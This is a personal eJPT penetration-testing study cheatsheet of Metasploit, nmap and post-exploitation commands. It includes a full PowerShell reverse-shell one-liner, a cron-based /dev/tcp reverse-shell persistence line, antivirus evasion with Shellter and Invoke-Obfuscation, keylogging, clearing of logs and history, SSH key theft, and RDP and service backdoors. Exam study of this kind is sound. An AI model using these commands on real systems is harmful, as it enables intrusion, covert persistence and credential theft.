# eJPTv2 Cheatsheet
- To Do
  - Finish 3.3
  - Finish 3.4
  - Rewatch 3.1
  - Rewatch 1.1, 1.2, 1.3, 1.4
  - Review old notes
  - Take Exam

# General
- [Metasploit](#Metasploit)
- [tmux](#tmux)
- [windows-resources](#windows-resources)

## Metasploit
```
sudo apt update
sudo apt install metasploit-framework

sudo systemctl enable postgresql
sudo systemctl start postgresql
systemctl status postgresql

msfdb
sudo msfdb init
sudo msfdb reinit
sudo msfdb status
```
```
sudo service postgresql start
service postgresql status

msfconsole -q
db_status

workspace -a <name>
workspace

setg RHOSTS <ip>
setg RHOST <ip>
```
```
sessions -l
sessions -i <session_id>
sessions -k <session_id>
```
```
meterpreter > background (or Ctrl + Z)
```
```
meterpreter > ps
meterpreter > ps -S <process_name>
meterpreter > pgrep <process_name>
meterpreter > migrate <pid>
meterpreter > migrate -N explorer.exe
meterpreter > migrate -N lsass.exe
meterpreter > getpid
```
```
Hold Ctrl + M + L to clear screen
```
```
hosts
services
creds
analyze
vulns
```
```
connect <ip> <port>
```

## tmux
```
tmux
tmux ls
tmux attach -t <session_id>
```
```
Ctrl + B, D — Detach from the current session.
Ctrl + B, C — Create a new window.
Ctrl + B, 0 (1,2...) — Move to a specific window by number.
```

## windows-resources
- `/usr/share/windows-resources/`
- `/usr/share/windows-resources/binaries/`


# 1 Info Gathering and Enumeration
- [Port Scanning](#Port-Scanning)

## Port Scanning
```
nmap -Pn -sV <ip>
```
- Useful flags
  - `-p<port>`, `-p<port_range>`
  - `-p-`
  - `-F`
  - `-O`
  - `-sC`
  - `-A`
  - `-sU`
  - `-sn`
  - `-T<0 to 5>`

```
nmap -Pn -sV <ip> -oX results
db_import results
```
```
db_nmap -Pn -sV <ip>
```
```
use auxiliary/scanner/portscan/tcp
use auxiliary/scanner/discovery/udp_sweep
```

## curl
```
curl http://<ip>:<port>
```
- Useful for analyzing a Web page in a shell-only environment.

# 2 Exploitation
- [ARP Poisoning](#ARP-Poisoning)
- [AV Evasion and Obfuscation](#AV-Evasion-and-Obfuscation)
- [BadBlue httpd 2.7](#BadBlue-httpd-27)
- [EternalBlue](#EternalBlue)
- [Exploit Database Binary Exploits](#Exploit-Database-Binary-Exploits)
- [Linux Compilation](#Linux-Compilation)
- [MSFVenom](#MSFVenom)
- [Payloads](#Payloads)
- [ProFTPD 1.3.3c](#ProFTPD-133c)
- [Rejetto HttpFileServer 2.3](#Rejetto-HttpFileServer-23)
- [Samba smbd 3.X - 4.X](#Samba-smbd-3X---4X)
- [vsftpd 2.3.4](#vsftpd-234)
- [XODA 0.4.5](#XODA-045)
- [Windows Cross-Compilation](#Windows-Cross-Compilation)

## ARP Poisoning
```
echo 1 > /proc/sys/net/ipv4/ip_forward
cat /proc/sys/net/ipv4/ip_forward
```
```
arpspoof -i <interface> -t <ip1> -r <ip2>
```
```
sudo wireshark -i <interface> -k
```

## AV Evasion and Obfuscation
```
sudo apt install shellter -y

sudo dpkg --add-architecture i386
sudo apt update
sudo apt install wine32 -y
```
```
mkdir ~/Desktop/AVBypass
cp /usr/share/windows-resources/binaries/vncviewer.exe ~/Desktop/AVBypass/vncviewer.exe

cd /usr/share/windows-resources/shellter
sudo wine shellter.exe
```
- Backup of EXE at `/usr/share/windows-resources/shellter/Shellter_Backups`.
- Select Stealth mode - `vncviewer.exe` will function normally.

```
cd ~/Desktop/AVBypass
git clone https://github.com/danielbohannon/Invoke-Obfuscation

sudo apt install powershell -y
```
```
$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
- https://github.com/swisskyrepo/PayloadsAllTheThings
- Remove `powershell -nop -c` and double-quotes `"`, then save as `shell.ps1`.

```
pwsh
cd ./Invoke-Obfuscation/
Import-Module ./Invoke-Obfuscation.psd1
cd ..
Invoke-Obfuscation
```
```
SET SCRIPTPATH /home/kali/Desktop/AVBypass/shell.ps1
ENCODING
1
```
```
BACK

SET SCRIPTPATH /home/kali/Desktop/AVBypass/shell.ps1
AST
ALL
1
```

## BadBlue httpd 2.7
```
use exploit/windows/http/badblue_passthru
```

## EternalBlue
```
use auxiliary/scanner/smb/smb_ms17_010

use exploit/windows/smb/ms17_010_eternalblue
```

## Exploit Database Binary Exploits
- https://gitlab.com/exploit-database/exploitdb-bin-sploits

## Linux Compilation
```
searchsploit -m 40839

gcc -pthread 40839.c -o dirty -lcrypt
```

## MSFVenom
- https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/msfvenom

## Payloads
```
windows/meterpreter/reverse_tcp
windows/meterpreter/bind_tcp
windows/x64/meterpreter/reverse_tcp
```

## ProFTPD 1.3.3c
```
use exploit/unix/ftp/proftpd_133c_backdoor
```

## Rejetto HttpFileServer 2.3
```
use exploit/windows/http/rejetto_hfs_exec
```
```
searchsploit -m 39161

cd ~/Desktop
cp /usr/share/windows-resources/binaries/nc.exe ./
python -m SimpleHTTPServer 80

vi 39161.py
Change ip_addr and local_port
nc -nvlp <port>

python 39161.py <ip> <port>
```

## Samba smbd 3.X - 4.X
```
use exploit/linux/samba/is_known_pipename
```

## vsftpd 2.3.4
```
use exploit/unix/ftp/vsftpd_234_backdoor
```

## XODA 0.4.5
```
use exploit/unix/webapp/xoda_file_upload
```
- Default payload is `php/meterpreter/reverse_tcp`.
- Set `TARGETURI` accordingly.

## Windows Cross-Compilation
```
sudo apt-get install mingw-w64 gcc
```
```
searchsploit -m 9303

i686-w64-mingw32-gcc 9303.c -o exploit
i686-w64-mingw32-gcc 9303.c -o exploit_32 -lws2_32
```
- Use 32-bit if unsure of target architecture.

# 3 Post-Exploitation
- [Keylogging](#Keylogging)
- [Cleanup Resource Scripts](#Cleanup-Resource-Scripts)
- [Clear Linux History](#Clear-Linux-History)
- [Clear Windows Event Logs](#Clear-Windows-Event-Logs)
- [Linux Local Enumeration](#Linux-Local-Enumeration)
- [Linux Persistence Via Cron Jobs](#Linux-Persistence-Via-Cron-Jobs)
- [Linux Persistence Via SSH Keys](#Linux-Persistence-Via-SSH-Keys)
- [Pivoting](#Pivoting)
- [SUDO Privileges](#SUDO-Privileges)
- [SUID Binaries](#SUID-Binaries)
- [Transfer Files](#Transfer-Files)
- [Upgrade Shells](#Upgrade-Shells)
- [Windows Local Enumeration](#Windows-Local-Enumeration)
- [Windows Persistence Via RDP](#Windows-Persistence-Via-RDP)
- [Windows Persistence Via Services](#Windows-Persistence-Via-Services)
- [Working Directories](#Working-Directories)

## Keylogging
```
meterpreter > getdesktop
```
```
meterpreter > keyscan_start
meterpreter > keyscan_dump
meterpreter > keyscan_stop
```
```
meterpreter > migrate -N winlogon.exe
```

## Cleanup Resource Scripts
```
meterpreter > resource <path_to_cleanup_rc_file>
```

## Clear Linux History
```
cat /dev/null > ~/.bash_history
history -c
```

## Clear Windows Event Logs
```
meterpreter > clearev
```

## Linux Local Enumeration
- Enumerating System Information
```
meterpreter > sysinfo

hostname
cat /etc/issue && cat /etc/*release
uname -a
uname -r
env
lscpu
free -h
df -h
lsblk
dpkg -l
cat /etc/shells
```

- Enumerating Users & Groups
```
meterpreter > getuid

id
cat /etc/passwd
ls -l /home
groups
groups <username>
who
w
last
lastlog
```
- `uid=0` is root.

- Enumerating Network Information
```
meterpreter > ifconfig
meterpreter > netstat
meterpreter > route
meterpreter > arp

ip a s
arp -a
cat /etc/networks
cat /etc/hostname
cat /etc/hosts
cat /etc/resolv.conf
```

- Enumerating Processes & Cron Jobs
```
meterpreter > ps
meterpreter > ps -S <process_name>
meterpreter > pgrep <process_name>

ps --help all
ps
ps aux
ps aux | grep root
ps aux | grep <process_name>
ps aux | grep -i <keyword>
top
crontab -l
crontab -l -u <username>
ls -al /etc/cron*
cat /etc/crontab
cat /etc/cron*
```

- Automating Linux Local Enumeration 
```
use post/linux/gather/enum_configs
use post/linux/gather/enum_network
use post/linux/gather/enum_system  
use post/linux/gather/checkvm

cat /root/.msf4/loot/<filename>.txt
```
- Post-exploitation modules need to `set SESSION <session_id>`.

- LinEnum
```
meterpreter > cd /tmp
meterpreter > upload /root/linenum.sh
meterpreter > ls
meterpreter > shell

/bin/bash -i
chmod +x linenum.sh
./linenum.sh
```
- https://github.com/rebootuser/LinEnum

## Linux Persistence Via Cron Jobs
```
ps -ef | grep cron

cat /etc/cron*
ls -al /etc/cron*

echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1'" > cron

crontab -i cron
crontab -l
```
```
nc -nvlp <port>
```

## Linux Persistence Via SSH Keys
```
ssh <username>@<ip>
cat .ssh/id_rsa

scp <username>@<ip>:/home/<username>/.ssh/id_rsa ./
chmod 400 id_rsa
ssh -i id_rsa <username>@<ip>
```

## Pivoting
```
meterpreter > ipconfig
meterpreter > arp
```
```
meterpreter > run autoroute -s <subnet_in_cidr>
meterpreter > run autoroute -p
```
```
use auxiliary/scanner/portscan/tcp
set RHOSTS <ip2>
```
```
meterpreter > portfwd add -l <local_port_on_kali> -p <remote_port_on_ip2> -r <ip2>
meterpreter > portfwd list

netstat -an | grep LISTEN
nmap -Pn -sV -p<local_port_on_kali> localhost
```
```
use <exploit_module>
set RHOSTS <ip2>
set RPORT <remote_port_on_ip2>
set payload windows/meterpreter/bind_tcp
```
- `LPORT` will be opened on `<ip2>`.

```
meterpreter > upload /root/tools/static-binaries/nmap /tmp/nmap
```

## SUDO Privileges
```
sudo -l
```
- https://gtfobins.github.io/

## SUID Binaries
```
find / -user root -perm -4000 -exec ls -ldb {} \;
```
- https://gtfobins.github.io/

## Transfer Files
- Set Up A Web Server With Python
```
python -m SimpleHTTPServer 80
python3 -m http.server 80
```
- Windows: `certutil -urlcache -f http://<ip>/<filename> <filename>`
- Linux: `wget http://<ip>/<filename>`


## Upgrade Shells
- Non-interactive to interactive
```
cat /etc/shells
/bin/bash -i
```
```
which python python3

python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
```
which python python3
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
Ctrl + Z

echo $TERM
stty -a
stty raw -echo
fg

reset
export SHELL=bash
export TERM=xterm-256color
stty rows <no_of_rows> columns <no_of_columns>
```

- Non-meterpreter to meterpreter
```
sessions -u <session_id>
```
```
use post/multi/manage/shell_to_meterpreter
set LHOST <ip>
set SESSION <session_id>
set WIN_TRANSFER VBS
```

## Windows Local Enumeration
- Enumerating System Information
```
meterpreter > sysinfo

hostname
systeminfo
wmic qfe get Caption,Description,HotFixID,InstalledOn
dir /b/s eula.txt
```

- Enumerating Users & Groups
```
meterpreter > getuid
meterpreter > getprivs

whoami
whoami /priv
query user
net users
net user <username>
net localgroup
net localgroup <group>
net localgroup Administrators

use post/windows/gather/enum_logged_on_users
set SESSION <session_id>
```

- Enumerating Network Information
```
ipconfig
ipconfig /all
route print
arp -a
netstat -ano
netsh firewall show state
netsh advfirewall show allprofiles
```
- Take note of APIPA addresses (`169.254.0.0/16`) in `arp -a` output.

- Enumerating Processes & Services
```
meterpreter > ps
meterpreter > ps -S <process_name>
meterpreter > pgrep <process_name>

net start
wmic service list brief
tasklist
tasklist /SVC

mkdir C:\Temp
schtasks /query /fo LIST /v > C:\Temp\schtasks.txt
exit

meterpreter > download C:\\Temp\\schtasks.txt

cat schtasks.txt
```
- `/SVC` shows the services hosted by the process.

- Automating Windows Local Enumeration
```
meterpreter > show_mount

use post/windows/gather/win_privs
use post/windows/gather/enum_logged_on_users
use post/windows/gather/enum_applications
use post/windows/gather/enum_patches
use post/windows/gather/enum_shares
use post/windows/gather/enum_computers
use post/windows/gather/checkvm

cat /root/.msf4/loot/<filename>.txt
```
- Post-exploitation modules need to `set SESSION <session_id>`.
- `win_privs` will also check if UAC is enabled.

- JAWS - Just Another Windows Script
```
meterpreter > mkdir C:\\Temp
meterpreter > cd C:\\Temp
meterpreter > upload /root/jaws-enum.ps1
meterpreter > shell

powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename jaws-enum.txt
exit

meterpreter > download C:\\Temp\\jaws-enum.txt

cat jaws-enum.txt
```
- https://github.com/411Hall/JAWS

## Windows Persistence Via RDP
```
meterpreter > run getgui -e -u <username> -p <password>

xfreerdp /u:<username> /p:<password> /v:<ip>
```
- Meterpreter script to create a RDP backdoor.
- Password must meet complexity requirements.

## Windows Persistence Via Services
```
use exploit/windows/local/persistence_service
set SESSION <session_id>
```
- Admin or system privileges required.
- Default payload is 32-bit meterpreter. Change payload/payload settings accordingly.
- `RETRY_TIME` 5 seconds.
- Other settings more for blending in e.g. `SERVICE_NAME`.

```
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <ip>
set LPORT <port>
```

## Working Directories
- Windows: `C:\Temp`
- Linux: `/tmp`
